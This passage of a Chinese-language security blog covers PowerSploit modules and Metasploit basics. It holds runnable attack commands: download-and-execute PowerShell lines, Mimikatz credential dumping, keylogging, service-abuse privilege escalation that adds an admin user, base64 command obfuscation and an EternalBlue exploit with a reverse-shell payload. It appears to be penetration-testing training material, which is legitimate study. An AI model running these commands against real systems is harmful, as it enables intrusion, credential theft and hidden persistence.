title="Invoke-Portscan"></a>Invoke-Portscan</h3><p>Invoke-Portscan是Recon模块下的一个脚本，主要用于端口扫描，使用起来比较简单。</p><pre><code class="hljs">                1.同样先使用以下命令下载脚本</code></pre><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">IEX (New-Object  Net.WebClient).DownloadString(<span class="hljs-string">&quot;http://192.168.31.247/PowerSploit/CodeExecution/Invoke-Portscan.ps1&quot;</span>)<br></code></pre></td></tr></table></figure><pre><code class="hljs">                2.使用以下命令进行扫描(目标机上)</code></pre><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">Invoke-Portscan  -Hosts 192.168.31.1.192.168.31.247 -Port <span class="hljs-string">&quot;80,22,3389&quot;</span><br></code></pre></td></tr></table></figure></li><li><h3 id="Invoke-Mimikatz"><a href="#Invoke-Mimikatz" class="headerlink" title="Invoke-Mimikatz"></a>Invoke-Mimikatz</h3><p>Invoke-Mimikatz是Exfiltration模块下的一个脚本</p><pre><code class="hljs">                    1.同样使用命令下载脚本</code></pre><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">IEX (New-Object  Net.WebClient).DownloadString(<span class="hljs-string">&quot;http://192.168.31.247/PowerSploit/CodeExecution/Invoke-Mimikatz.ps1&quot;</span>)<br></code></pre></td></tr></table></figure><pre><code class="hljs">                    下载即可                    2.执行命令</code></pre><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">Invoke-Mimikatz   -DumpCreds<br></code></pre></td></tr></table></figure></li></ul><h4 id="Get-Keystrokes"><a href="#Get-Keystrokes" class="headerlink" title="Get-Keystrokes:"></a>Get-Keystrokes:</h4><p>Get-Keystrokes是Exfiltration模块下的一个脚本，用于键盘记录，功能相当强大，不仅有键盘记录，甚至记录鼠标的点击情况，还能记录详细的时间，实战时可以直接放入后台运行。</p><p>同样先使用以下命令下载脚本：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">IEX(New-Object Net.WebClient).DownloadString(<span class="hljs-string">&quot;http://192.168.31.247/PowerSploit/Exfiltration/Get-Keystores.ps1&quot;</span>)<br></code></pre></td></tr></table></figure><p>使用以下命令开启键盘记录：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">Get-Keystrokes -LogPathc:\test1.txt<br></code></pre></td></tr></table></figure><h4 id="PowerUP攻击模块："><a href="#PowerUP攻击模块：" class="headerlink" title="PowerUP攻击模块："></a>PowerUP攻击模块：</h4><p>PowerUp是Privesc模块下的一个脚本，功能相当强大，拥有众多用来寻找目标主机windows服务漏洞进行提权的实用脚本。</p><p>加载模块：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sh">这里是本机所以直接导入<br>Import-Module  .\PowerUp.ps1<br><br>如要查看各个模块的详细说明，可以输入<br>get-help[cmdlet] -full<br>比如：<br>get-Help Invoke-ALLChecks   -full<br></code></pre></td></tr></table></figure><p>Invoke-ALLChecks:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">该模块会自动执行powerup下所以脚本啦检查目标主机，输出命令即可执行<br>Invoke-ALLChecks<br></code></pre></td></tr></table></figure><h4 id="Find-PathDLLHijack"><a href="#Find-PathDLLHijack" class="headerlink" title="Find-PathDLLHijack:"></a>Find-PathDLLHijack:</h4><p>该模块用于检查当前%PATH%的那些目录是用户可以写入的，输入以下命令即可执行该模块：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-built_in">Find</span>-Pathdllhijack<br></code></pre></td></tr></table></figure><h4 id="Get-RegistryAlwaysInstallElevated"><a href="#Get-RegistryAlwaysInstallElevated" class="headerlink" title="Get-RegistryAlwaysInstallElevated:"></a>Get-RegistryAlwaysInstallElevated:</h4><p>该模块用于检查AlwaysInstallElevated注册表项是否被设置，如果已被设置，意味着MSI文件以system权限运行的</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">Get-RegistryAlwaysInstallElevated<br></code></pre></td></tr></table></figure><h4 id="Get-RegistryAutoLogon"><a href="#Get-RegistryAutoLogon" class="headerlink" title="Get-RegistryAutoLogon:"></a>Get-RegistryAutoLogon:</h4><p>该模块用于检查winlogin注册表的autoadminlogon项有没有被设置，可以查询默认的用户名和密码，执行该模块的命令：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">Get-RegistryAutoLogon<br></code></pre></td></tr></table></figure><h4 id="Get-ServiceDetail"><a href="#Get-ServiceDetail" class="headerlink" title="Get-ServiceDetail:"></a>Get-ServiceDetail:</h4><p>该模块用于返回某服务的信息，输入以下命令即可执行该模块</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">Get-ServiceDetail -ServiceName Dhcp                   <span class="hljs-comment">#获取DHCP服务的详细信息</span><br></code></pre></td></tr></table></figure><h4 id="Get-ServiceFilePermission"><a href="#Get-ServiceFilePermission" class="headerlink" title="Get-ServiceFilePermission:"></a>Get-ServiceFilePermission:</h4><p>该模块用于检查当前用户能够在那些服务的目录写入相关联的可执行文件，我们可以通过这些文件实现提权，输入以下命令即可执行该模块。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">Get-ServiceFilePermission<br></code></pre></td></tr></table></figure><h4 id="Test-ServiceDaclPermission"><a href="#Test-ServiceDaclPermission" class="headerlink" title="Test-ServiceDaclPermission:"></a>Test-ServiceDaclPermission:</h4><p>该模块用于检查所有可用的服务，并尝试对这些打开的服务进行修改，如果可修改，则返回该服务对象：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">Test-ServiceDaclPerssion<br></code></pre></td></tr></table></figure><h4 id="Invoke-ServiceAbuse"><a href="#Invoke-ServiceAbuse" class="headerlink" title="Invoke-ServiceAbuse:"></a>Invoke-ServiceAbuse:</h4><p>该模块通过修改服务来添加用户到指定组，并可以通过设置-cmd参数触发添加用户的自定义命令，执行该模块的命令。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">Invoke-ServiceAbuse -ServiceName VulnSVC    <span class="hljs-comment">#添加默认账号</span><br>Invoke-ServiceAbuse -ServiceName VulnSVC   -UserName <span class="hljs-string">&quot;Test\john&quot;</span>     <span class="hljs-comment">#指定添加的域账户</span><br>Invoke-ServiceAbuse -ServiceName VulnSVC   -UserName <span class="hljs-built_in">test</span>  -Password  password  -LocalGroup  <span class="hljs-string">&quot;Administrators&quot;</span>     <span class="hljs-comment">#指定添加用户，用户密码以及添加的用户组</span><br>Invoke-ServiceAbuse -ServiceName VulnSVC   -Command <span class="hljs-string">&quot;net .......&quot;</span>         <span class="hljs-comment">#自定义执行命令</span><br></code></pre></td></tr></table></figure><h4 id="PowerUp攻击模块实战演练："><a href="#PowerUp攻击模块实战演练：" class="headerlink" title="PowerUp攻击模块实战演练："></a>PowerUp攻击模块实战演练：</h4><p>先加载PowerUp脚本，然后执行Invoke-ALLChecks，脚本将进行所有的检查</p><p>将powerup脚本上传至目标服务器，再从本地执行该脚本</p><p>使用IEX再内存中加载此脚本，执行以下命令：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">PowerShell.exe  -<span class="hljs-built_in">exec</span> bypass <span class="hljs-string">&quot;IEX(New-Object Net.WebClient).DownloadString(&#x27;C:\PowerUp.ps1&#x27;);Invoke-ALLChecks&quot;</span><br></code></pre></td></tr></table></figure><p>也可以再CMD环境下使用命令绕过执行该脚本：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">powershell.exe  -<span class="hljs-built_in">exec</span> bypass -Command  <span class="hljs-string">&quot;&amp;&#123;Import-Module  .\PowerUp.ps1;  Invoke-ALLChecks&#125;&quot;</span><br></code></pre></td></tr></table></figure><h2 id="使用Base64编码对Powershell命令进行编码"><a href="#使用Base64编码对Powershell命令进行编码" class="headerlink" title="使用Base64编码对Powershell命令进行编码"></a>使用Base64编码对Powershell命令进行编码</h2><p>使用ps_encoder.py脚本加密（<a href="https://github.com/h4sh5/ps_encoder%EF%BC%89">https://github.com/h4sh5/ps_encoder）</a></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">./ps_encoder.py <span class="hljs-literal">-s</span> script.txt<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20240108105015813.png" alt="image-20240108105015813"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell <span class="hljs-literal">-encodedCommand</span> YwBhAGwAYwAuAGUAeABlAAoA<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20240108105039366.png" alt="image-20240108105039366"></p>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>powershell基础知识</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>msf使用基础</title>
    <link href="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/"/>
    <url>/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h1 id="使用介绍"><a href="#使用介绍" class="headerlink" title="使用介绍"></a>使用介绍</h1><h4 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h4><p>metasploit程序需要使用postgresql数据库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">手动启动数据库：<br><br>service postgresql start<br><br>设置成开机启动数据库：<br><br>systemctl <span class="hljs-built_in">enable</span> postgresql<br></code></pre></td></tr></table></figure><h5 id="1-1基础命令"><a href="#1-1基础命令" class="headerlink" title="1.1基础命令"></a>1.1基础命令</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfconsole    <span class="hljs-comment">#进入框架</span><br>search  ms17_010                                    <span class="hljs-comment"># 使用search命令查找相关漏洞</span><br>use exploit/windows/smb/ms17_010_eternalblue        <span class="hljs-comment"># 使用use进入模块</span><br>info         <span class="hljs-comment">#使用info查看模块信息</span><br><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/reverse_tcp    <span class="hljs-comment">#设置攻击载荷</span><br>show options    <span class="hljs-comment">#查看模块需要配置的参数</span><br><span class="hljs-built_in">set</span>  RHOST  192.168.100.158        <span class="hljs-comment">#设置参数</span><br>exploit / run         <span class="hljs-comment">#攻击</span><br>后渗透阶段<span class="hljs-comment">#后渗透阶段</span><br></code></pre></td></tr></table></figure><p><strong>1.2查找模块</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">search 模块名<br>//比如我要找永恒之蓝 search ms17_010<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107183155173.png" alt="image-20240107183155173"><br>使用那个模块 use 模块名或use 前面的数字都可以<br><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107183209746.png" alt="image-20240107183209746"><br><strong>1.3使用模块</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#查看要设置的参数</span><br>show options<br><span class="hljs-comment">#查看模块详情</span><br>info<br><span class="hljs-comment">#设置载荷  有很多可以自行选择</span><br> <span class="hljs-built_in">set</span> payload windows/x64/meterpreter/reverse_tcp<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107183222015.png" alt="image-20240107183222015"><br><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107183237763.png" alt="image-20240107183237763"><br><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107183249768.png" alt="image-20240107183249768"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#运行模块</span><br>run 或者 exploit<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107183300439.png" alt="image-20240107183300439"><br><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107183309747.png" alt="image-20240107183309747"><br><strong>1.4命令行模式的一些基础操作</strong><br>输入help可以查看支持的操作，但是乱码了，莫慌，可以解决。<br><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107183321088.png" alt="image-20240107183321088"><br>输入 chcp 65001<br><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107183330992.png" alt="image-20240107183330992"><br>乱码没有了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs bash">核心后台脚本：<br><br>bgkill       关闭一个后台的meterpreter脚本<br><br>bglist   列出所有正在运行的后台脚本<br><br>bgrun   将一个meterpreter脚本以后台线程模式运行<br><br>channel   显示或者控制一个活动频道<br><br>close 关闭一个频道<br><br><span class="hljs-built_in">exit</span>终止meterpreter会话<br><br>get_timeouts获得当前会话的<span class="hljs-built_in">timeout</span>值<br><br>getuid查看当前权限<br><br><span class="hljs-built_in">help</span>帮助菜单<br><br>info 显示post模块信息<br><br>irb进入ruby脚本模式<br><br>load加载meterpreter扩展<br><br>migrate   将会话迁移到一个指定PID的进程<br><br>quit 结束meterpreter会话<br><br><span class="hljs-built_in">read</span>从频道中读取数据<br><br>resource运行文件中的命令<br><br>run 执行一个meterpreter脚本或者post模块<br><br>sessions    快速地切换到另一个会话<br><br>background切换到后台<br><br>run checkvm  查看是否是虚拟机<br><br>steal_token 伪造身份<br><br></code></pre></td></tr></table></figure><p>伪造身份：<br><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107183353523.png" alt="image-20240107183353523"></p><h4 id="正反向载荷"><a href="#正反向载荷" class="headerlink" title="正反向载荷"></a>正反向载荷</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">windows/meterpreter/bind_tcp       <span class="hljs-comment">#正向连接</span><br>windows/meterpreter/reverse_tcp    <span class="hljs-comment">#反向连接，常用</span><br>windows/meterpreter/reverse_http   <span class="hljs-comment">#通过监听80端口反向连接</span><br>windows/meterpreter/reverse_https  <span class="hljs-comment">#通过监听443端口反向连接</span><br></code></pre></td></tr></table></figure><h6 id="正向连接使用场景："><a href="#正向连接使用场景：" class="headerlink" title="正向连接使用场景："></a>正向连接使用场景：</h6><p>  我们的攻击机在内网环境，被攻击机是外网环境，由于被攻击机无法主动连接到我们的主机，所以就必须我们主动连接被攻击机了。但是这里经常遇到的问题是，被攻击机上开了防火墙，只允许访问指定的端口，比如被攻击机只对外开放了80端口。那么，我们就只能设置正向连接80端口了，这里很有可能失败，因为80端口上的流量太多了。</p><h6 id="反向连接使用场景："><a href="#反向连接使用场景：" class="headerlink" title="反向连接使用场景："></a><strong><code>反向连接使用场景</code>：</strong></h6><p>  我们的主机和被攻击机都是在外网或者都是在内网，这样被攻击机就能主动连接到我们的主机了。如果是这样的情况，建议使用反向连接，因为反向连接的话，即使被攻击机开了防火墙也没事，防火墙只是阻止进入被攻击机的流量，而不会阻止被攻击机主动向外连接的流量。</p><h4 id="各个模块"><a href="#各个模块" class="headerlink" title="各个模块"></a>各个模块</h4><ul><li><h6 id="辅助模块-Auxiliary"><a href="#辅助模块-Auxiliary" class="headerlink" title="辅助模块(Auxiliary)"></a>辅助模块(Auxiliary)</h6><p>1、使用smb_ms17_010漏洞探测模块对smb_ms17_010漏洞进行探测：<br>命令: 可以 search auxiliary看有哪些模块</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">use auxiliary/scanner/smb/smb_ms17_010<br></code></pre></td></tr></table></figure><p>2、查看这个模块需要配置的信息：<br>命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">show options  <span class="hljs-comment">#查看这个模块需要配置的信息</span><br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107204941011.png" alt="image-20240107204941011"></p><p>3、设置要探测的远程目标：</p><p>注：RHOSTS 参数是要探测主机的ip或ip范围，我们探测一个ip范围内的主机是否存在漏洞</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> rhosts 192.168.100.100-192.168.100.190<br></code></pre></td></tr></table></figure></li><li><h6 id="攻击模块-exploit"><a href="#攻击模块-exploit" class="headerlink" title="攻击模块(exploit)"></a>攻击模块(exploit)</h6><p>1.使用某个攻击模块</p><p>命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/windows/smb/ms17_010_eternalblue<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107205127130.png" alt="image-20240107205127130"></p><p>2.查看这个漏洞的信息：<br>命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">info<br></code></pre></td></tr></table></figure><p>3、查看可攻击的系统平台，显示当前攻击模块针对哪些特定操作系统版本、语言版本的系统：<br>命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">show target<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107205257010.png" alt="image-20240107205257010"></p></li><li><h6 id="Payload攻击载荷模块"><a href="#Payload攻击载荷模块" class="headerlink" title="Payload攻击载荷模块"></a>Payload攻击载荷模块</h6><p>攻击载荷是我们期望在目标系统在被渗透攻击之后完成的实际攻击功能的代码，成功渗透目标后，用于在目标系统上运行任意命令。</p><p>1、查看攻击载荷：<br>命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">show  payloads  <span class="hljs-comment">#该命令可以查看当前漏洞利用模块下可用的所有Payload</span><br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107205338130.png" alt="image-20240107205338130"></p><p>2、设置攻击载荷：<br>命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/reverse_tcp<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107205406374.png" alt="image-20240107205406374"></p><p>3、查看模块需要配置的参数：<br>命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">show  options<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107205441581.png" alt="image-20240107205441581"></p><p>4、设置攻击载荷参数：<br>命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> RHOST 192.168.100.158   <span class="hljs-comment">#设置RHOST，也就是要攻击主机的ip</span><br><span class="hljs-built_in">set</span> LHOST 192.168.100.132   <span class="hljs-comment">#设置LHOST，也就是我们主机的ip，用于接收从目标机弹回来的shell</span><br><span class="hljs-built_in">set</span> lport 6666              <span class="hljs-comment">#设置lport，也就是我们主机的端口，反弹shell到这个端口；如果我们这里不设置lport的话，默认是4444端口监听；</span><br></code></pre></td></tr></table></figure><p>5、进行攻击：</p><p><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107205520019.png" alt="image-20240107205520019"></p></li><li><h6 id="后渗透阶段"><a href="#后渗透阶段" class="headerlink" title="后渗透阶段"></a>后渗透阶段</h6><p>运行了<code>exploit命令</code>之后，我们开启了一个<code>reverse TCP监听器</code>来监听本地的<code>6666</code>端口，即我（攻击者）的本地主机地址（LHOST）和端口号（LPORT）。运行成功之后，我们将会看到命令提示符 <code>meterpreter &gt;</code> 出现：</p><p><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107205700145.png" alt="image-20240107205700145"></p><p>Meterpreter的命令用法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br></pre></td><td class="code"><pre><code class="hljs bash">Meterpreter &gt; ?<br>==========================================<br>核心命令：<br>==========================================<br>命令                           说明<br>-------                       ------------<br>?                             帮助菜单<br>background                    把当前会话挂到后台运行<br><span class="hljs-built_in">bg</span>                            background命令的别名<br>bgkill                        杀死后台meterpreter 脚本<br>bglist                        